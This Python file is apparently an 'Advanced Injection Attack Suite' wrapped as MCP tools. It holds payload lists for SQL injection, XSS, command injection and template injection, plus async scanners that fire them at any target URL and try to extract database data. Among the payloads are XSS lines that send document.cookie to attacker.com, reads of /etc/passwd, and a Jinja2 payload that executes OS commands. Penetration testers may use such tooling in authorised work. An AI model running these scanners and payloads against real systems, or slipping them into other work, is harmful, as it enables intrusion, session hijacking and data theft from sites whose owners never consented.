"""
Advanced Injection Attack Suite
SQL Injection, XSS, Command Injection, SSTI with auto-exploitation
"""

import asyncio
import json
import re
import base64
import time
from typing import Dict, Any, List, Optional
from urllib.parse import quote, urlencode, parse_qs, urlparse
import httpx


# Advanced SQL Injection Payloads
SQLI_PAYLOADS = {
    "error_based": [
        "'",
        "''",
        "`",
        "´",
        "\"",
        "''",
        "\\'",
        "\\\"",
        "1' AND 1=1--",
        "1' AND 1=2--",
        "1' OR '1'='1",
        "1' AND EXTRACTVALUE(1, CONCAT(0x7e, VERSION()))--",
        "1' AND updatexml(1, concat(0x7e, version()), 1)--",
        "1' AND (SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)--",
    ],
    "time_based": [
        "1' AND SLEEP(5)--",
        "1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
        "1' AND IF(1=1, SLEEP(5), 0)--",
        "1'; WAITFOR DELAY '0:0:5'--",
        "1' AND pg_sleep(5)--",
        "1' AND dbms_pipe.receive_message(('a'),5)--",
    ],
    "union_based": [
        "1' UNION SELECT NULL--",
        "1' UNION SELECT NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL--",
        "1' UNION SELECT NULL,NULL,NULL,NULL--",
    ],
    "extraction": [
        "1' UNION SELECT @@version,NULL--",
        "1' UNION SELECT user(),NULL--",
        "1' UNION SELECT database(),NULL--",
        "1' UNION SELECT table_name,NULL FROM information_schema.tables--",
        "1' UNION SELECT column_name,NULL FROM information_schema.columns--",
    ]
}

# Advanced XSS Payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
    "<input onfocus=alert('XSS') autofocus>",
    "<details open ontoggle=alert('XSS')>",
    "<marquee onstart=alert('XSS')>",
    "<a href=javascript:alert('XSS')>click</a>",
    "<object data=javascript:alert('XSS')>",
    "<embed src=javascript:alert('XSS')>",
    "<form action=javascript:alert('XSS')><button>submit</button></form>",
    "<isindex type=image src=1 onerror=alert('XSS')>",
    "<math><mtext><table><mglyph><style><img src=x onerror=alert('XSS')>",
    "<img src=x:alert(alt) onerror=eval(src) alt=XSS>",
    "<script>fetch('http://attacker.com/?c='+document.cookie)</script>",
    "<img src=x onerror=fetch('http://attacker.com/?c='+document.cookie)>",
]

# Command Injection Payloads
CMDI_PAYLOADS = [
    "; id",
    "; whoami",
    "; cat /etc/passwd",
    "; ls -la",
    "; pwd",
    "| id",
    "| whoami",
    "`id`",
    "$(id)",
    "&& id",
    "|| id",
    "; echo 'CMDINJECTIONTEST'",
    "| echo 'CMDINJECTIONTEST'",
    "`echo CMDINJECTIONTEST`",
    "$(echo CMDINJECTIONTEST)",
]

# SSTI Payloads
SSTI_PAYLOADS = {
    "jinja2": [
        "{{ 7*7 }}",
        "{{ config }}",
        "{{ self.__init__.__globals__ }}",
        "{{ ''.__class__.__mro__[1].__subclasses__() }}",
        "{{ request.application.__globals__.__builtins__.__import__('os').popen('id').read() }}",
    ],
    "twig": [
        "{{ 7*7 }}",
        "{{ dump() }}",
        "{{ app.request.server.all }}",
    ],
    "smarty": [
        "{ 7*7 }",
        "{$smarty.version}",
        "{php}echo 'SSTITEST';{/php}",
    ],
    "velocity": [
        "#set($x=7*7)$x",
        "#set($e=\"SSTITEST\")$e",
    ],
}


async def advanced_sqli_scanner(target: str, parameter: str = None, 
                                technique: str = "all") -> Dict[str, Any]:
    """
    Advanced SQL Injection scanner with automatic exploitation.
    
    Args:
        target: Target URL
        parameter: Parameter to test (auto-detected if None)
        technique: SQLi technique (error_based, time_based, union_based, all)
        
    Returns:
        Dict with SQLi findings and extraction results
    """
    findings = {
        "vulnerable": False,
        "parameter": parameter,
        "technique": None,
        "database_type": None,
        "extracted_data": {},
        "payloads_confirmed": [],
        "exploitation_level": "None"
    }
    
    parsed = urlparse(target)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    
    # Get parameters
    if parameter:
        params = {parameter: "1"}
    else:
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()} if parsed.query else {"id": "1"}
    
    test_param = parameter or list(params.keys())[0]
    
    try:
        async with httpx.AsyncClient() as client:
            # Test error-based SQLi
            if technique in ["all", "error_based"]:
                for payload in SQLI_PAYLOADS["error_based"]:
                    test_params = params.copy()
                    test_params[test_param] = payload
                    
                    url = f"{base}?{urlencode(test_params)}"
                    
                    try:
                        resp = await client.get(url, timeout=10.0)
                        
                        # Check for SQL errors
                        error_signatures = [
                            ("MySQL", ["mysql_fetch", "mysqli_", "You have an error", "syntax error"]),
                            ("PostgreSQL", ["PostgreSQL", "pg_query", "pg_exec"]),
                            ("MSSQL", ["Microsoft SQL", "mssql_", "ODBC SQL Server"]),
                            ("Oracle", ["ORA-", "Oracle error", "oci_"]),
                            ("SQLite", ["SQLite", "sqlite_"]),
                        ]
                        
                        for db_type, signatures in error_signatures:
                            if any(sig.lower() in resp.text.lower() for sig in signatures):
                                findings["vulnerable"] = True
                                findings["technique"] = "Error-Based"
                                findings["database_type"] = db_type
                                findings["payloads_confirmed"].append(payload)
                                
                                # Try to extract version
                                if db_type == "MySQL":
                                    version_payload = "1' AND EXTRACTVALUE(1, CONCAT(0x7e, @@version))--"
                                    test_params[test_param] = version_payload
                                    version_url = f"{base}?{urlencode(test_params)}"
                                    
                                    try:
                                        v_resp = await client.get(version_url, timeout=10.0)
                                        version_match = re.search(r'~(\d+\.\d+\.\d+[^~<]*)', v_resp.text)
                                        if version_match:
                                            findings["extracted_data"]["version"] = version_match.group(1)
                                            findings["exploitation_level"] = "Data Extraction Confirmed"
                                    except:
                                        pass
                                
                                return findings
                                
                    except Exception:
                        continue
            
            # Test time-based SQLi
            if technique in ["all", "time_based"] and not findings["vulnerable"]:
                for payload in SQLI_PAYLOADS["time_based"][:3]:  # Test first 3
                    test_params = params.copy()
                    test_params[test_param] = payload
                    
                    url = f"{base}?{urlencode(test_params)}"
                    
                    try:
                        start = time.time()
                        resp = await client.get(url, timeout=15.0)
                        elapsed = time.time() - start
                        
                        if elapsed > 4.5:
                            findings["vulnerable"] = True
                            findings["technique"] = "Time-Based"
                            findings["payloads_confirmed"].append(payload)
                            findings["response_time"] = f"{elapsed:.2f}s"
                            break
                    except:
                        continue
            
            # Test union-based
            if technique in ["all", "union_based"] and not findings["vulnerable"]:
                for payload in SQLI_PAYLOADS["union_based"]:
                    test_params = params.copy()
                    test_params[test_param] = payload
                    
                    url = f"{base}?{urlencode(test_params)}"
                    
                    try:
                        resp = await client.get(url, timeout=10.0)
                        
                        # Check if UNION syntax works
                        if resp.status_code == 200:
                            # Look for data structure changes
                            if len(resp.text) > 100:
                                findings["vulnerable"] = True
                                findings["technique"] = "Union-Based"
                                findings["payloads_confirmed"].append(payload)
                                break
                    except:
                        continue
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


async def advanced_xss_scanner(target: str, crawl: bool = True) -> Dict[str, Any]:
    """
    Advanced XSS scanner with automatic exploitation verification.
    
    Args:
        target: Target URL
        crawl: Whether to discover and test forms/inputs
        
    Returns:
        Dict with XSS findings
    """
    findings = {
        "vulnerable": False,
        "type": None,  # reflected, stored, dom
        "confirmed_payloads": [],
        "cookie_stealable": False,
        "session_hijack_possible": False,
        "vulnerable_parameters": [],
        "vulnerable_endpoints": []
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    # Test parameters
    test_params = ['q', 's', 'search', 'id', 'page', 'cat', 'tag', 'name', 'ref', 'callback']
    
    try:
        async with httpx.AsyncClient() as client:
            # Test reflected XSS
            for param in test_params:
                for payload in XSS_PAYLOADS[:8]:  # Test first 8 payloads
                    try:
                        separator = '&' if '?' in base else '?'
                        url = f"{base}{separator}{param}={quote(payload)}"
                        
                        resp = await client.get(url, timeout=10.0)
                        
                        # Check if payload is reflected unencoded
                        if payload in resp.text:
                            # Check for encoding
                            is_unencoded = '<script' in resp.text or 'onerror=' in resp.text or 'onload=' in resp.text
                            
                            if is_unencoded:
                                findings["vulnerable"] = True
                                findings["type"] = "Reflected"
                                findings["confirmed_payloads"].append({
                                    "payload": payload,
                                    "parameter": param,
                                    "url": url,
                                    "execution_context": "Unencoded reflection confirmed"
                                })
                                findings["vulnerable_parameters"].append(param)
                                
                                # Check cookie security
                                set_cookie = resp.headers.get('set-cookie', '')
                                if 'httponly' not in set_cookie.lower():
                                    findings["cookie_stealable"] = True
                                    findings["session_hijack_possible"] = True
                                
                                break
                    except:
                        continue
                
                if findings["vulnerable"]:
                    break
            
            # If crawling enabled, test forms
            if crawl and not findings["vulnerable"]:
                try:
                    resp = await client.get(base, timeout=15.0)
                    from bs4 import BeautifulSoup
                    soup = BeautifulSoup(resp.text, 'html.parser')
                    forms = soup.find_all('form')
                    
                    for form in forms[:3]:  # Test first 3 forms
                        action = form.get('action', base)
                        method = form.get('method', 'get').lower()
                        inputs = form.find_all('input')
                        
                        form_data = {}
                        for inp in inputs:
                            name = inp.get('name')
                            if name:
                                form_data[name] = XSS_PAYLOADS[0]
                        
                        if form_data:
                            try:
                                if method == 'post':
                                    form_resp = await client.post(action, data=form_data, timeout=10.0)
                                else:
                                    form_resp = await client.get(action, params=form_data, timeout=10.0)
                                
                                if XSS_PAYLOADS[0] in form_resp.text:
                                    findings["vulnerable"] = True
                                    findings["type"] = "Stored" if method == 'post' else "Reflected"
                                    findings["vulnerable_endpoints"].append(action)
                            except:
                                pass
                except:
                    pass
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


async def command_injection_scanner(target: str, parameter: str = None) -> Dict[str, Any]:
    """
    Command injection scanner with blind detection.
    
    Args:
        target: Target URL
        parameter: Parameter to test
        
    Returns:
        Dict with command injection findings
    """
    findings = {
        "vulnerable": False,
        "blind": False,
        "command_output": None,
        "confirmed_payload": None,
        "os_type": None
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    parsed = urlparse(base)
    
    if not parameter:
        params = {k: v[0] for k, v in parse_qs(parsed.query).items()} if parsed.query else {"host": "test"}
        parameter = list(params.keys())[0]
    
    try:
        async with httpx.AsyncClient() as client:
            for payload in CMDI_PAYLOADS:
                try:
                    separator = '&' if '?' in base else '?'
                    url = f"{base}{separator}{parameter}={quote(payload)}"
                    
                    resp = await client.get(url, timeout=15.0)
                    
                    # Check for command output
                    output_signatures = [
                        ("Linux", ["uid=", "gid=", "root:", "bin:", "daemon:"]),
                        ("Windows", ["windows", "administrator", "users\\"]),
                        ("Generic", ["CMDINJECTIONTEST"]),
                    ]
                    
                    for os_type, signatures in output_signatures:
                        if any(sig in resp.text for sig in signatures):
                            findings["vulnerable"] = True
                            findings["command_output"] = resp.text[:500]
                            findings["confirmed_payload"] = payload
                            findings["os_type"] = os_type
                            return findings
                    
                    # Check for blind injection via time delay
                    if 'sleep' in payload.lower() or 'timeout' in payload.lower():
                        start = time.time()
                        resp = await client.get(url, timeout=10.0)
                        elapsed = time.time() - start
                        
                        if elapsed > 4:
                            findings["vulnerable"] = True
                            findings["blind"] = True
                            findings["confirmed_payload"] = payload
                            findings["note"] = "Blind command injection via time delay confirmed"
                            return findings
                            
                except:
                    continue
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


async def ssti_scanner(target: str, parameter: str = None) -> Dict[str, Any]:
    """
    Server-Side Template Injection scanner.
    
    Args:
        target: Target URL
        parameter: Parameter to test
        
    Returns:
        Dict with SSTI findings
    """
    findings = {
        "vulnerable": False,
        "template_engine": None,
        "confirmed_payload": None,
        "rce_possible": False
    }
    
    base = target if target.startswith(('http://', 'https://')) else f"https://{target}"
    
    if not parameter:
        parameter = "name"
    
    try:
        async with httpx.AsyncClient() as client:
            for engine, payloads in SSTI_PAYLOADS.items():
                for payload in payloads:
                    try:
                        separator = '&' if '?' in base else '?'
                        url = f"{base}{separator}{parameter}={quote(payload)}"
                        
                        resp = await client.get(url, timeout=10.0)
                        
                        # Check for template execution
                        if engine == "jinja2":
                            if "49" in resp.text and "7*7" in payload:  # 7*7=49
                                findings["vulnerable"] = True
                                findings["template_engine"] = "Jinja2"
                                findings["confirmed_payload"] = payload
                                findings["rce_possible"] = True
                                return findings
                            elif "config" in payload and "Config" in resp.text:
                                findings["vulnerable"] = True
                                findings["template_engine"] = "Jinja2"
                                findings["confirmed_payload"] = payload
                                return findings
                        
                        elif engine == "twig":
                            if "49" in resp.text and "7*7" in payload:
                                findings["vulnerable"] = True
                                findings["template_engine"] = "Twig"
                                findings["confirmed_payload"] = payload
                                return findings
                        
                        elif engine == "smarty":
                            if "SSTITEST" in resp.text:
                                findings["vulnerable"] = True
                                findings["template_engine"] = "Smarty"
                                findings["confirmed_payload"] = payload
                                return findings
                                
                    except:
                        continue
    
    except Exception as e:
        findings["error"] = str(e)
    
    return findings


# MCP Tool Wrappers
async def full_injection_scan(target: str, parameters: List[str] = None) -> str:
    """
    Complete injection vulnerability scan (SQLi, XSS, Command, SSTI).
    
    Args:
        target: Target URL
        parameters: List of parameters to test
        
    Returns:
        JSON with all injection findings
    """
    results = await asyncio.gather(
        advanced_sqli_scanner(target, parameters[0] if parameters else None),
        advanced_xss_scanner(target),
        command_injection_scanner(target, parameters[0] if parameters else None),
        ssti_scanner(target, parameters[0] if parameters else None)
    )
    
    critical_count = sum(1 for r in results if r.get("vulnerable") and 
                        r.get("exploitation_level") == "Data Extraction Confirmed" or
                        r.get("session_hijack_possible") or r.get("rce_possible"))
    
    return json.dumps({
        "scan_type": "Full Injection Assessment",
        "target": target,
        "sql_injection": results[0],
        "xss": results[1],
        "command_injection": results[2],
        "ssti": results[3],
        "summary": {
            "total_vulnerabilities": sum(1 for r in results if r.get("vulnerable")),
            "critical_issues": critical_count,
            "sql_injection_found": results[0].get("vulnerable"),
            "xss_found": results[1].get("vulnerable"),
            "command_injection_found": results[2].get("vulnerable"),
            "ssti_found": results[3].get("vulnerable")
        },
        "severity": "Critical" if critical_count > 0 else "High" if sum(1 for r in results if r.get("vulnerable")) > 0 else "Medium"
    }, indent=2)
